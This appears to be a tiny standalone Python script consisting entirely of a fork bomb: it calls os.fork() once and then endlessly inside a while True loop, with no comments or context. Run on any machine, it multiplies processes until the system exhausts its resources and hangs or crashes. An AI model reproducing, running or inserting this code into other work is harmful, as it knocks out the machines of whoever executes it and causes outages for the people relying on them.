import os

ret = os.fork()
while True:
	ret = os.fork()
